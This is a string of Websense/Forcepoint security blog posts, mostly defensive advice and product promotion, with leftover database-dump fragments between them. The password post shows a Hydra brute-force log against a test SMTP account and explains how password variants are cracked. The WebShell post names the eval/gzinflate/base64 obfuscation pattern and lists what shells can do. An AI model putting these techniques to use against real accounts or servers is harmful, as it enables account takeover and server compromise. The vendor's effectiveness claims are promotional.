data we can tell that more certificates get revoked each year, and we can make a guess that this number will keep growing in the next few years.\n\nIt is no doubt that revocation checking is very important for certificate verification, but many certificate verification tools do not check it at all during the verification process. Here are some interesting facts about certificate revocation checking:\n\n1. Internet Explorer on Windows XP does not offer support for OCSP, thus Internet Explorer only supports OCSP on Windows Vista and later.\n\n2. Internet Explorer on Windows XP does not check certificate revocation for web servers by default.\n\nGo to Tools > Internet Options > Advanced to find the two options which control revocation checking. Check for server certificate revocation controls (whether revocation checks occur for HTTPS connections) and for publisher’s certificate revocation controls (whether revocation checks occur when validating the Authenticode digital signatures on downloaded programs and ActiveX controls).\n\n\n\nBy default, Windows Vista and later enable revocation checks in both scenarios, while Internet Explorer on Windows XP only enables Authenticode Revocation checking by default because of the performance impact of downloading CRLs for HTTPS connections.\n\n3. When Internet Explorer checks certificate revocations on Windows Vista or later, if a given certificate specifies a CRL or OCSP URL, but the revocation check cannot be completed (i.e. the Certificate Authority’s server is not reachable), Internet Explorer will not notify the user.\n\n4. Some well-known browsers like Chrome do not even check server revocation by default.\n\nAll these lead to security risks when doing certificate verification. In fact, a lot of work has been done by Windows to improve the safety of the certificate revocation process, even though it is hard to completely eradicate all security risks. We suggest our customers use newer versions of operating systems and browsers, which could mitigate those risks in some ways.\n\nWebsense can successfully protect customers on these issues.\n\nWebsense ACE™, our Advanced Classification Engine, does a complete certificate verification when doing file classification: during this verification process, it downloads and parses CRL files to check certificate revocation state, and what’s more, it even implements a cache mechanism to speed up this checking process. For some vulnerabilities discovered by the public during certificate verification process, Websense ACE has carefully checked itself to make sure all vulnerabilities are correctly patched - for example take MS12-024/CVE-2012-0151, where ACE has implemented counter measures into its code based on detailed analysis, thus it won’t be fooled by malicious samples. ThreatSeeker® Intelligence Cloud also successfully handles these security issues, all digital signatures are carefully verified and the certificate revocation state is correctly checked.', 'https://www.forcepoint.com/blog/security-labs/digging-certificate-revocation-lists\n');

This is precisely why over the past few months the Websense Security Labs researched and documented the gravity of the Java security risk.\n\nOur initial research reviewed real-time telemetry collected from the Websense ThreatSeeker Intelligence Cloud to determine which versions of Java are actively used across tens of millions of endpoints. The results of our research were frightening to say the least.\nWebsense Security Labs Research: Java Vulnerabilities\n\nSo how pervasive is the Java threat? Real-world network traffic showed that, of network computers using Java to access information on the web, 93 percent were vulnerable to known Java exploits. To follow up on this initial research, Websense Security Labs investigated how quickly businesses update Java to patch against known vulnerabilities. When Java introduced an update on April 16th, we again tracked real-world web requests to document Java version usage.\nAs the graph shows, the results of our research indicate that the Java patch management process is woefully slow. After a full week, the average adoption of the newest version of Java was at less than three percent. After two weeks, the trend line had moved to a little over four percent. And after a month, close to seven percent were using the most recent version of Java.\nEven more frightening was the fact that:\n\n\n    More than 75 percent of the computers used Java versions more than six months old.\n    \n    \n    Nearly two-thirds were more than a year out of date.\n    \n    \n    And more than 50 percent of browsers were greater than two years behind the times with respect to Java vulnerabilities.\n    \nTake a look at the control panel for any crime kit and you’ll see that Java exploits are one of the most successful gateways into an organization to infect machines and steal sensitive data.\nSo if roughly 10 percent of enterprises or less are proactively managing known critical Java vulnerabilities through patch management and version control, what security measures are the other 93 percent relying on to protect their systems from compromise and data theft?\nStay tuned\n\nIn a series of upcoming blog posts, we will be looking at this issue, and more, including:\n\n\n    Why is it so hard to manage Java on an enterprise level?\n    \n    \n   Best practices to remediate Java risk \n    \n    \n    A brief foray into the world of Java versus javascript (and their collected associated risks)\n    \n    \n    Why Java is targeted (no, you can’t just blame it on poor coding; we are going to look at where Java plays within the Seven Stages of Advanced Threats)\n    \n    \n    Finally, we’ll take a look at risks associated with other plugins, extensions and programs that function in a manner similar to Java \n    \nStay tuned to this blog for more information.

This is the first time that smartphone users have outnumbered feature phone users, and this will translate into increased smartphones in the work environment. So what is the impact on your business with this influx of smart devices?\n\nThe \"iPass Mobile Workforce Report,\" released in June 2013, states that 62 percent of mobile workers are using personal devices for professional productivity. This means that more and more consumers are bringing their smart devices into the office. The increased amount of smartphones also translates into additional bandwidth considerations for IT. Similar to corporate-issued laptops, mobile devices are used at work for recreational activities; however, because these devices are not issued by the company, many IT departments have no idea how many are accessing the network, what apps are being used and how much bandwidth is being consumed.\n\nLastly, many of these new devices are accessing corporate data. A survey released by the CTIA wireless association and conducted by Harris Interactive found that regardless of company policy regarding the use of personal devices, employees are using their own notebooks, smartphones and tablets to access work data. The top five information systems or applications accessed by employees are email accounts, calendars, databases, company apps and directories.\n\nIT departments need to take control of what is happening and secure company assets/IP. Teams can develop and execute a strategy to allow a mixture of corporate and personally-owned devices onto the network, while putting controls in place that ensure data and network safety. Here are three steps to ensure protection of company data while maintaining privacy of the user\'s personal information on a mobile device:  \nCreate and publish a corporate mobile policy (utilize an Acceptable Use Policy (AUP) kit to get started).\nDeploy a mobile device management (MDM) solution. This is a good first step to be able to manage the various devices on the corporate infrastructure.\nProtect your mobile workforce from advanced threats with a complete security solution, which protects users and the corporate network from malicious links, web attacks, exploits and more.\nAs the mobile workforce continues to grow, companies need to implement the same safeguards that have been implemented for their corporate networks and extend them to their mobile team.

For this test report, Websense® TRITONTM Web Security Gateway Anywhere (WSGA) was evaluated against comparable products from Blue Coat®, Cisco®, McAfee®, Palo Alto NetworksTM and FireEye®, Inc.\n\nFor the first test, and the main focus of the report, Websense blocked more threats than any other product tested for a large volume of web requests of an unknown nature. Each web request and response was analyzed by specific solution defenses to protect the user at the point of click. The second test in the report looked at specific threat kill chain stages and the security effectiveness provided of the tested solutions for those threat stages. Specifically, web and email lures, exploit kit detection and dropper file threat stages were individually tested, pushing defenses beyond known ratings and reputations. The third test validated new innovative data theft defenses within the WSGA solution using DLP as a containment defense. The fourth test reviewed forensic reporting details for two solutions providing this level of analysis, and the fifth test reviewed time and motion for administrative controls and reporting. \n\nLet\'s dive a little deeper so I can explain exactly how the first test was conducted.\n\nThe Miercom testing of web security gateways for the first test was designed to evaluate each vendors\' ability to protect users in real-time and validate each product\'s effectiveness accordingly. Its testing methods gave each vendor a fair and equal chance of analyzing, classifying and blocking threats in real-time, as they would if deployed on a network for the web request and response. \n\nTo simulate a real-world web environment, Miercom used a data set of more than 2.25 million open live web requests of an unknown nature. In fact, this is the largest audited web security effectiveness test to date. Additionally, using web requests of an unknown nature is unique in the information security industry. By comparison, most vendors elect to test a known set of malware, producing artificially favorable results. Identifiable malware is not indicative of what is actually happening on the Internet and in businesses today as a web request from a user can result in more than 100 dynamic links to fill out requested web content. This is why the results of this test are of huge importance to those chosen to protect at the point of click in real-time. \n\nThe \"point of click\" is one of the most critical moments to your business; this is the instance when a user\'s action kicks your security defenses into gear. This test was designed to validate the proactive security measures each vendor provided as the web requests occurred for the request and the response. When Miercom looked at \"proactive\" security, it was fundamentally about analyzing, investigating and evaluating all contextual content. The goal was not based on how well the solutions are recognizing what they already know-but how well they are identifying and protecting against risks they do not know. \n\nEven common obfuscation techniques render signature-based solutions ineffective. This is where the first test underscores Websense TRITON solutions clearly deliver results well beyond other competitors.. When you add in the zero-day threats that are occurring more frequently in advanced attacks, the effectiveness gap grows even more substantial. Zero-day exposure time is one of the more dangerous variables in your organization\'s ability to defend against cybercrime - along with human curiosity.\n\nMiercom\'s test results validate that in order to effectively safeguard against  advanced malware and data theft, your organization needs a security solution that can  live web requests in real-time.\nTraditional antivirus, firewall and URL filtering tools are no longer enough to protect users against today\'s advanced cyberthreats. \n\nFor more details on the tests and results, download a full copy of the Miercom Security Effectiveness Report.

With advanced cyberattacks, data theft by employees through portable storage devices and stories of accidental data loss, we have had increasing insight to the frightening ramifications of data theft.\nHere are 10 quick points to consider when contemplating how to keep your sensitive data secure and protected against data theft:\nEndpoint Protection - Intellectual property (IP) and confidential data is often \"in-use\" on endpoints, putting it out of reach of the protection offered by simple pattern data loss prevention (DLP) controls in firewalls and gateways. DLP endpoints can protect on and off-network devices to control what is copied, printed or transferred (including data moving to portable media drives).\n  Portable Encryption - When data must be moved off the network and off the endpoint, you can enforce encryption for tighter control of that information.\n  Enterprise DLP Controls - The differences between simple pattern-matching DLP solutions from fuller, enterprise-grade protection include: data registration (fingerprinting), advanced machine learning of data, data categorization as it is created, and defined policies for all content that matters to your organization\'s success.\n  Prevention Polices Protect Property - This alliteration reminds us that often the key to success with DLP controls is getting to the prevention phase of a deployment. Often projects stall in data discovery and monitoring phases. To avoid this, start with a small set of confidential data and work the project all the way through to prevention. You could secure your most sensitive data within 6-8 weeks!\n  Remediation and Auditing - Moving to DLP prevention policies can cause an unfounded fear of stopping data-in-motion and business processes. The key to solving this is to implement DLP solutions that allow end users to provide explanations for data use and self-remediate. This keeps data flowing while allowing visibility to administrators.\n  DLP as a Defense - Security gateways that use DLP as a defense are critical when detecting password file theft, use of criminal encryption and slow data leaks over time. Geo-location destination awareness and incident reporting through forensics can provide important data theft information for mitigation and post-incident analysis.\n  Image Text Analysis - Smartphones and camera-enabled devices now make it very easy to capture data. In addition, many times the sensitive data you are looking to protect are images themselves. The top DLP solutions now provide the ability to use optical character recognition (OCR) to analyze text within images and prevent data exposure.\n  Malware and Hacking - We must recognize that DLP and data protection also hinge on solid defenses against advanced threats, malware and hacking. Implementing enterprise DLP without reviewing web and email gateway defenses is a common mistake. Traditional defenses such as AV, firewalls and URL filtering continue to be less effective. Therefore, it is essential that we look for real-time defenses that are put into action at the point-of-click.\n  Phishing and Education - Building on the malware and hacking point, awareness is key with end users. Run phishing tests with select audiences to educate them on how to detect phishing attempts. Email defenses should also be able to sandbox and analyze URLs at the point-of-click.\n  Get Funding - This can be the hardest part: getting senior management to recognize the threat of data theft and loss toyour organization. News stories and headlines often aren\'t enough to convince executives that it can\'t happen to your data, which is what an attacker wants them to think. Here\'s something you can do to help convince executives of the urgency of the situation: Turn on any and all monitoring defenses (even if they are more simple defenses) to document ALL manner of incidents to share with your leadership team. If you would like more information on how to share information with your team, our CSO has a great post on this subject available for you.', 'https://www.forcepoint.com/insights/10-data-security-tips-keep-your-sensitive-information-where-it-belongs\n');

Any technology relying solely on signature based defenses is quickly becoming ineffective in today\'s world. Today\'s web security solutions need to have strong analytical capabilities to decide whether something poses a threat or not, even if no signature is in existence. To do this effectively, a business needs to deploy a wide array of defenses for full life cycle protection before, during, and after an attack: Before an attack security intelligence offers protection against known threats. During an attack real-time defenses protect against advanced threats and data theft. After an attack threat analysis sandboxing and forensic reporting offer valuable additional insight and analytics.\n	\n	\n		Does the web security solution offer built-in DLP and data theft protection capabilities? Many vendors state that DLP is part of their web security solution. However a closer evaluation often reveals that either a stand-alone solution needs to be deployed with custom integration, or the DLP functionality is restricted to character matching and simple patterns known to over block and frustrate administrators. To do DLP well, a vendor needs to deploy a contextually aware DLP engine that can determine if data is at risk of being lost or stolen.\n	\n	\n		How user friendly and useful is the reporting and threat dashboard functionality? Reporting serves as a valuable decision and information sharing tool for IT and security professionals. Threat dashboards provide visibility into critical incidents with forensic details on who was attacked, how the attack happened, where attack communications were destined, and what data was targeted. The easier and more comprehensive these tools are, and the more insight they provide, the more valuable they will be to security administrators.\n	\n	\n		Does the vendor offer support of hybrid environments? Today\'s business environment proves to be complex with many endpoints and variables. Employees are no longer just working from the office. They access the corporate network from home, hotels, or public areas. They access the network from Windows, MacOS, iOS , Android, and many other devices. Web security solutions need to provide security to all of these users and scenarios in the most efficient way which often results in hybrid deployments.\n	\n	\n		Does the vendor offer a single SKU pricing model? In today\'s world where companies mix and match on-premises and within cloud deployments, single SKU pricing models are convenient for customers, because they allow greater flexibility for companies deploying web security solutions.\n	\n\n	The just-released Magic Quadrant for Secure Web Gateways offers credible, third-party insights and answers to all of the above questions and provides extremely valuable decision making tools to companies considering a new web security solution with the right functionality for today\'s changing web environment.\n\n\n\n	To download a copy of the Gartner Magic Quadrant Secure Web Gateway report, click here.', 'https://www.forcepoint.com/blog/insights/gartner%E2%80%99s-magic-quadrant-secure-web-gateways-can-help-you-pick-right-web-security\n');

It is not, however, the be-all and end-all: users are still responsible for choosing strong, hard-to-guess passwords. If your password is compromised, control of your account may be lost to malicious actors.\n\n\n	While it\'s true that, given enough time and resources, all passwords are crackable regardless of their complexity – a pass-string of 200 random characters is ultimately just as vulnerable to brute forcing as a password containing just one character – the aim of a complex pass-string  is to make an attack temporally infeasible. Let’s first take a look at the total number of possible combinations for a given base of elements:\n\n\n	\n\n\n	This table encompasses repeating characters and is subject to lexicality (ordering).\n\n\n	Of course, the first row contains all possible words in the English language, up to 8 characters. This may seem an unattainable number of combinations, but with modern GPUs (Graphics Processing Units) able to calculate hashes at a rate of up to 772 MH/s (772 million hashes per second) , the first row would be exhausted in around 270 seconds, or about 4.5 minutes.\n\n\n	A user is unlikely to choose 8 arbitrary characters when creating a password that will be used on a daily basis; a typical string is likely to have some semantic content, such as a dictionary word (and various mutations thereof). Knowing this, crackers have produced many aids for this type of attack, including dictionary files and Rainbow tables – similar to dictionary files, but containing pre-computed hashes and the plaintext equivalent.\n\n\n	To give an example of how quickly weak passwords can be cracked, we set up a test using a simple Python script and Backtrack 5’s Hydra combined with a moderate GPU, and targeted a test SMTP account:\n\n\n	Hydra v7.3 (c)2012 by van Hauser/THC & David Maciejak - for legal purposes only\n\n\n	Hydra (http://www.thc.org/thc-hydra) starting at 2013-05-23 07:08:12\n\n\n	……\n\n\n	login: ******   password: dave123\n\n\n	[VERBOSE] using SMTP LOGIN AUTH mechanism\n\n\n	1 of 1 target successfully completed, 1 valid password found\n\n\n	Hydra finished at 2013-05-23 07:08:51\n\n\n	<finished>\n\n\n	 \n\n\n	The password contained only 36 possible chars: lower case a-z & 0-9, and was cracked in 39 seconds.\n\n\n	While major sites will have (or should have) authentication attempt throttling, it’s not uncommon for minor sites to allow unlimited attempts to access an account, which, coupled with password reuse, is a huge problem.\n\n\n	Users I have spoken to told me they use different passwords for different sites in almost all cases. When quizzed further, I found they typically used the same base string with some simple mutations, for example:\n\n\n		password\n	\n		Password\n	\n		Passw0rd\n	\n		passw0rd!1\n	\n		pa$5w0rd!1\n\n	Knowing the base string, and with a very simple substitution (1337, symbols etc.) algorithm, we can crack these accounts in mere seconds. It’s trivial for an attacker to automate this process, meaning accounts on some forgotten, compromised server can be obtained, leading to accounts with the same user name being attacked and possibly compromised.\n\n\n	As Twitter will attest, using secure, hard to guess pass-strings and varying user names (not always possible)  are an absolute must for anybody who uses systems, applications, or sites accessible to others. Remember, it’s not just the internet that has people after your credentials; rogue employees and disgruntled exes, to name but two, are on the lookout for your details. \n\n\n	To ensure accounts are as secure as possible, it’s advisable to:\n\n\n		Use strong, hard to guess, non-dictionary pass-strings. If the app doesn\'t allow you to use a mix of alphanumeric and special characters, you may not want the owner to have your details.\n	\n		Never, ever reuse passwords. It’s also good practice to not reuse passwords with simple substitutions.\n	\n		Ensure old accounts are deactivated where possible. Although you cannot trust a database would be purged of credentials, it’s certainly a start.\n	\n		Think before signing up to a site or service; always read their security policy.\n	\n		Be vigilant! Phishing is an easy-win for cyber criminals, so don’t give them an easy ride – sites and services will (or should) _never_ ask for your password via email.\n\n	Abiding by these rules will help make passwords as secure as they can be.', 'https://www.forcepoint.com/blog/security-labs/twitter-adopt-2fa-here-what-you-can-do\n');

What makes this story interesting is not necessarily the level of sophistication of the attack (most of the technologies used have probably been around for some time), but that it involves both cybercrime (data theft and manipulation of financial data) and good old fashioned in-person ATM withdrawals to monetize the data theft.\n\nSo far, it is unclear from the story exactly how the hackers gained access to the debit card information, or how they eliminated the withdrawal limits of the debit cards involved. One could imagine a low and slow data theft campaign that stole a few debit card numbers at a time to remain undetected. Instead, this story is a perfect example to illustrate the innovation hackers employ to turn data theft into financial gain. It doesn\'t always have to be high-tech from beginning to end.

First, Q1 2013 smartphone sales finally surpassed regular feature phone sales. Second, total smartphone sales increased 41.6 percent. So why does this increase the smartphone threat level?\n\nCybercriminals have always been attracted to the most popular platforms. The first widespread PC viruses were on the early Apple platforms, such as Apple II and Apple IIc. However, the threat shifted to the IBM PC the same year that IBM sales surpassed Apple PC sales. Web browser threats followed the same pattern as they often exploited Internet Explorer until Firefox and Chrome became widely used alternatives. Today, even Safari is at risk, but mainly due to cyberthreats that exploit Java and other popular common components.\nNevertheless, today\'s cyberattacks have a wide variety of objectives. They are not all focused on a single smartphone platform. For example, while IDC reports only a 17.3 percent overall market share for the iPhone, it is still very popular in many sectors of business making it a primary conduit to reach victims. Conversely, cybercriminals looking to attack a broader audience will likely target Android-based devices.\nIDC also recently conducted the 2013 U.S. Mobile Security Survey where they interviewed 200 IT decision-makers to gauge their stance on personal mobile devices (PMDs) in the enterprise. Turns out, 62.5 percent of all respondents said their organization embraces the bring your own device (BYOD) movement. In addition, more than 50 percent of employees access corporate data on mobile devices while traveling on business. \nMobile security education, tools and best practices\nMost organizations adopt BYOD to help their nomadic workforce be more productive. The problem is mobile devices, specifically smartphones, seldom have adequate mobile security software. Mobile security risks also extend to the growing use of tablets in the workspace. Mitigating this risk requires a combination of education, security tools and best practices.\nEducation should begin by helping users understand that the threat is real and present. No platform is safe, and all apps are suspicious. Both iTunes and Google Play have unknowingly distributed malicious apps. Also, jail-breaking a device is the height of mobile recklessness. Unfortunately, many users perceive mobile threats as \'hype\' and do not respect the potential damage their device can inflict on the organization. In addition, recent surveys have revealed that 30 to 50 percent of users do not password protect their devices. The Websense 2013 Security Predictions includes a spotlight article on mobile threats. Simply sharing it may help you educate your users.\nSecurity tools must extend beyond mobile device management (MDM) and must address both threats and data loss protection.

With the help of our Websense® ThreatSeeker® Intelligence Cloud, we came across a few examples in which attackers have used different techniques.  These are elaborated on further in this blog. \n\n\n	Many mass compromises are accomplished in an automated fashion: vulnerabilities are enumerated, and after one is found, exploits are automatically deployed. The takeover process usually involves downloading a remote administration tool for the compromised website. One common tool deployed by attackers once they compromise a website is a WebShell. \n\n\n	\n\n\n	The above diagram shows an attack where the attacker finds a vulnerability in a hosted web application and manages to upload a malicious application backdoor in one of the server supported languages.  This gives him control over the entire web server. \n\n\n	What is a WebShell?\n\n\n	A WebShell is a script/code (written in scripting languages such as PHP, Perl, or Python) that runs on the system and can remotely administer a machine. Although WebShells are used as a Remote Administration Tool for many legitimate reasons, they can still be abused by malware authors to compromise websites.  Once the attacker gets a web server to execute the script, he gains shell-level access to the host operating system running with the same privileges as the web server. To avoid detection by firewalls or antivirus technologies, the attacker usually employs evasion techniques such as code obfuscation and encryption. To thwart this aspect of the WebShell\'s propagation, a full content inspection approach can reveal, and intercept, a wide variety of common obfuscation techniques and even decrypt the script to expose its real intent. Let\'s look at an example. \n\n\n	In the following example, we see a custom WebShell called \"oRb\". The actual WebShell body is obfuscated to avoid detection, using a preg_replace function with the \"e\" modifier.  Hex encoding has been used to conceal eval(gzinflate(base64_decode( .  \n\n\n	\n\n\n	The URL that serves the WebShell further tries to confuse or mislead security tools by declaring in the header that thecontent type is animage file, as you can see below: \n\n\n	\n\n\n	With its real-time scanning capability, Websense ACE™ (our Advanced Classification Engine) detects the obfuscation methods and techniques discussed above.\n\n\n	\n\n\n	Let\'s now look at a second example to see the type of functionality that WebShells encompass. In this case we see a non-obfuscated version of \"RC Shell v2.0\",  which is similar to our previous example in that it also tries to hide as an image:\n\n\n	\n\n\n	\n\n\n	A working WebShell\n\n\n	Once the WebShell script is run, it provides a web interface for remote operations on the server, including, but not limited to: \n\n\n		Server Information\n	\n		File manager (access to file system)\n	\n		Access to execute commands\n	\n		SQL manager\n	\n		PHP code execution\n	\n		Bruteforce FTP, MySQL, PgSQL\n	\n		Search files, search text in files\n	\n		Malicious content upload\n	\n		Mass code injection  \n\n	This animated image shows how it would look when run (click the image to open; the animation loops):\n\n\n	\n\n\n	Websense ThreatSeeker Intelligence Cloud processes approximately up to 5 billion web requests per day, and out of those requests, just yesterday we found 1400 unique examples of threats using WebShells in different countries. Here is an example of how one obfuscated WebShell is spread around the globe.\n\n\n	\n\n\n	How does Websense protect against WebShells?\n\n\n	The animated graphic above shows how powerful the access can be for an attacker. \n\n\n	ACE will block access to this malicious WebShell script/page if your end users locate such a script.  In addition to preventing access to the malicious WebShell script/page, we monitor outbound content to prevent sensitive data from leaving an organization via shell commands even if the abused channel is SSL-encrypted - which is a common advanced malware technique.  With the help of web telemetry we can generalize to the tune of 85,000,000+ compromised websites and thus learn from them, including what we have discussed here about WebShells.  Have a read of our Threat Report to find out more.', 'https://www.forcepoint.com/blog/security-labs/webshells-webshells-web-server\n');

It’s the perfect time to remind employees how to safely surf Facebook, specify when “liking” content. \nBelow I’ve detailed five best practices that you can share to mitigate the risk of using the Like button. Ultimately, to minimize risk, you want to remove opportunities for compromise. This means using real-time security technology that can examine the ever-changing content on social media pages.\nFive tips for safe Facebook liking:\n1. Raise the bar for Liking content. If you are a frequent “Liker,” break the habit of clicking the Like button on anything and everything.\n2. If it sounds too good to be true, it probably is. Many Likejacking scams start on Facebook as a “Win a free iPad” lure.\n3. Avoid voyeuristic lures such as “The Sexiest Facebook post.” This includes unlikely viral videos, like videos that claim to be of the Boston Marathon attack “AS IT HAPPENS!,” when no news sites have the content.\n4. Avoid offers and surveys that mandate you like something in order to view content.\n5. If you are suspicious, go to ACEInsight.com. Right click on a Like and select ‘Copy Shortcut’ to capture the link. Then paste that link into http://csi.websense.com/ for free real-time analysis. It will detail potential threats.\nAbuse of the Like button is just one of the many flavors of today’s complex attacks. If an intended victim doesn’t click on the Like button lure, perhaps the criminal element can tempt the target to activate code that exploits a Java vulnerability or other holes in your defense. Social networks are just one of the avenues for complex attacks. Blocking access to Facebook is not going to stop the ingress of threats which may appear in other social networks, websites and emails.\nThe complexity of these attacks contributes to the ongoing decline of traditional signature-based defenses. Dynamic defenses, that analyze content, scripts, files, connections and other factors to make real-time decisions, are the only way to protect against the many stages of an attack. With the right security intelligence, you can even mitigate zero-day threats.\nHow? Click on over to our Websense ACE (Advanced Classification Engine) page and see how we approach proactive defenses and use threat intelligence to secure web, email, mobile and data.\nHeck, if you are feeling like clicking, head on over to Facebook and give us a Like there:www.facebook.com/websense', 'https://www.forcepoint.com/insights/part-ii-five-best-practices-when-facebook-liking\n');

On the day of the launch, CEO Mark Zuckerberg said, \"we are building a web where the default is social.\" For the Like button’s third birthday party, there are a number of groups who will cheer this socialization of the web. However, you may not Like everyone who will be celebrating.\nFacebook will be partying, if only because the Like button has enjoyed much greater success than many other Facebook innovations. In an average minute, there are more than 382,000 Likes posted on Facebook. More than 2.5 million websites have integrated with Facebook via the Like button. There have now been approximately 2.7 billion unique Likes on Facebook, meaning more than 955 billion in an average year.\nMany businesses will celebrate how the Like button has allowed them to easily track the interest level of the content they offer, and to connect Facebook visitors to content on their other web properties. It was recently estimated that 10,000 new websites connect to Facebook every day.\nMany customers will also celebrate as they receive more value from their online experience with these businesses, making it a win-win for everyone involved. In addition, Like buttons can be used to initiate downloads, redirect users and serve as a “Like gate,” which allows users to access hidden, bonus or exclusive content.\nBut employees fired for ‘Liking’ content their employers disapproved of will not be celebrating. And Facebook’s own celebrations may be dampened due to a lawsuit from the widow of a Dutch programmer. Her husband reportedly patented the concept of a Like button in 1998 for use on his Surfbook social network.\nThese two examples bring us to another faction who is no doubt praising the introduction of the Like button. The Facebook lawyers and those arguing for freedom of speech legal protection when they use the Like button will have many reasons to make merry.\nFinally, the cyber-underground will likely be partying, due to success in abusing the Like button. “Likejacking” scams have popped up periodically, almost since the introduction of the feature. Whether in a form of click fraud, or redirecting users to malware and other malicious content outside of Facebook through the ubiquity of the Like button on web pages, Like means money to cybercriminals.\nRecently, Websense Security Labs blog warned of holiday-themed scams using the Like button. Similar features in Pinterest and other online services have also been abused by cybercriminals throughout the last year.\nIn many ways, the like button may have incidentally facilitated a step beyond Zuckerberg’s vision; a web where the default threat is social.

I attended the first National Institute of Standards and Technology (NIST) request for information (RFI) workshop as a representative to begin developing the NIST cybersecurity framework for implementation.\nThere are three goals guiding this process, and over the course of the event we got a solid start toward achieving these deliverables:\n\nIdentify existing cybersecurity standards, guidelines, frameworks and best practices applicable to increasing the security of critical infrastructure sectors and other interested entities.\n    Specify high-priority gaps for which new or revised standards are needed.\n    Collaboratively develop action plans by which these gaps can be addressed. The development process for this action plan will have requisite stages for continuing engagement with the owners and operators of critical infrastructure and other industry, academic and government stakeholders.\nFive Key Takeaways\nWhat do NIST and a new framework for cybersecurity mean to the private sector? It’s a clear sign that cybersecurity has moved from obscure awareness to mainstream importance. This government mandate is reflecting the need to address vulnerabilities in our cybersecurity infrastructure—both in the private and public sector.\nBelow I’ve detailed five key NIST workshop takeaways for any CSO:\n\nOur approach to cybersecurity, risk and threat management must evolve to meet a heightened new “normal” for security challenges. Each organization needs to know their enemy, know the threat and be prepared to the meet the challenges of a mobile, always-connected workforce.\n    We must change behaviors, actions and the way we define the problem. The new norm for cyber intrusions comes in the form of persistent threats and data theft. We need to examine and measure the threats, risks and the ultimate business value to understand the impact of this new paradigm.\n    CSOs and CISOs are struggling with how to educate the executive suite about the problem. Internal communication and crisp messaging are paramount when explaining the need for protection (here’s a link a blog post with a few tips).\n    This new framework is a down payment on the cybersecurity defense program. It needs to take into consideration both foreign and domestic needs.\n    Public and private sector ownership is critical. As industry leaders, we own the problem and can make recommendations on the most effective standards.\nNow that the April 8th submission deadline has passed, we will reconvene in subsequent scheduled working sessions. During these meetings, we will again roll up our sleeves and put these RFI session ideas into the actual cybersecurity framework.\n\n  Stay tuned for more insight on the NIST process.

Below are six steps for a successful data security control implementation.\n\nStep one: Calculate the value of your data\nWithout a plan, this can be the most difficult part of the process. Data values can rise and fall as quickly as financial markets. The key to solving this problem is working with your executives and information owners. Determine a simple formula to estimate the value of your data. \n\nOne of the best examples I’ve seen comes from research group, Securosis. Data value, frequency and audience is quantified within a table and allotted a score. Examples of data types include card data, PII, IP, sales data and any other specific data you are required to protect. An overall score is then defined based on the type of data. Below is an example:\n\n \n\n\nBy scoring the data types, you can prioritize the importance of the data.  Including frequency and audience also helps determine the likelihood of data-loss and again assists when prioritizing where and when to apply an action.  \n\nStep two: Make your ROI case\nTo increase security spend, and roll-out new data security controls, you must demonstrate ROI. This means clearly quantifying the immense value that comes when you know where your data is, who is accessing it and how it’s being used. My colleague, Jason Clark, Websense CSO, has provided some excellent tips on how to communicate this with your C-Suite and board members in a separate Websense Insights blog.\nI strongly believe it’s critical to analyze, communicate and share the financial and organizational impact of stolen and lost data.\n\nStep three: Monitor and log your data\nNext, start monitoring who has access to data and observe its movement around your network. Many organizations will turn to a data loss prevention (DLP) solution for this. The best DLP solutions have the ability to monitor the perimeter entry/exit points for data in motion and thoroughly monitor endpoints for data in use. \nThe initial monitoring phase should not last longer than a few weeks after deployment, even after tuning your policies to remove false positives. A good solution should quickly provide clarity into common data movement trends. Just remember, don’t forget to monitor EVERY location where your data flows, including the often-overlooked printers, scanners, mobile devices and cloud services.\n\nStep four: Apply data security controls\nI often speak with organizations that are stuck in step three monitoring and logging mode. Identifying incidents as they happen, but they are still not confident in applying controls to stop data leaving the organization. This is a mistake. \n\nGartner Inc. demonstrated some time ago that passive security controls were dead. The same goes for DLP used exclusively in a monitor-only deployment. It doesn’t demonstrate ROI to most businesses, especially if a significant loss or breach occurs, while you are “monitoring.” We must apply controls. \nFirst, revisit your most valuable data. Start amending the rules and policies to begin active protection of those crown jewels. I don’t recommend enabling all block rules immediately. In my experience, I have seen that a phased approach is the most efficient way of applying data security controls.\n\nStep five: Find your data\nOnce you have a score associated with each data type, and the funding, the next stage is to locate the sensitive data on your network. Based on the scoring exercise iterated above, it’s always advisable to begin this process with the most valuable data. Focusing on your crown jewels minimizes the negative impact to your network. Unfortunately, stand-alone discovery and mining services are usually expensive and take a considerable time to run. \n\nAnother option is relying on DLP solutions. Most leading DLP solutions offer a mechanism to discover, identify and fingerprint data in periodic sweeps. These sweeps can often take place daily, weekly and monthly. This process provides a marked increase in visibility and improved efficiency through identifying duplicate data and flagging it. Many organizations waste large amounts of money backing up and storing duplicated data. To a security officer, reducing the cost of this process is great additional justification for the purchase of a DLP solution.\n\nStep six: Implement proactive protection and up employee education\nAs user awareness becomes more prominent, the number of blocked incidents will stabilize and the number of monitored incidents will go down. Why? A typical end user is much more aware prior to clicking on a link or sending an email if they understand that these actions will result in a block and notification. As a result, information owners and security teams gain tremendous value through proactive protection, as well as a beneficial reduction in the IT team’s workload.\nBelow is a graph showing proactive protection in action. The number of incidents steadily decreased when a 2,500 user enterprise activated blocked actions in October 2012.\n\n \n\nI may have made the previous steps sound easy to implement—they should be. A data security control strategy can add more value than any technical solution deployed within an organization.\nHave any questions on these steps?

That’s how I characterize the often-difficult process of explaining the importance of data security to your executives and employees. Clearly communicating the challenges we face protecting our organizational “crown jewels” is one of the biggest obstacles security professionals face.\nI’m often asked “How is infrastructure security different from data security?” The simplest answer: infrastructure security protects the availability of your IT systems, while data security protects the confidentiality and integrity of your information.\nMost companies have solid infrastructure security programs. They have traditional defenses: distributed denial of service (DDoS) attack mitigations, firewalls and intrusion prevention systems (IPS). In most scenarios, these defenses are owned by both network and security teams. Most security professionals consider this appropriate protection at the network level, but not adequate. \nMany are looking to implement the next breed of solutions to build out application layer protections and take a deeper dive into the TCP/IP protocols, which provide context surrounding an event. While the additional information available with this second stage of deployment is significant—it should NOT be considered a data security control.\nHere’s why: data loss prevention (DLP) is an advanced control. It protects confidentiality and integrity of your data. The value that a DLP solution offers is the advanced context, or the, “who, what, where and how,” of data storage, access and transmission. This full context is something that perimeter infrastructure defenses do not offer.\nIn the next blog post, I’ll provide six steps to deploying data security controls to gain necessary visibility.', 'https://www.forcepoint.com/insights/turning-lights-%E2%80%A6-infrastructure-security-vs-data-security-part-i\n');

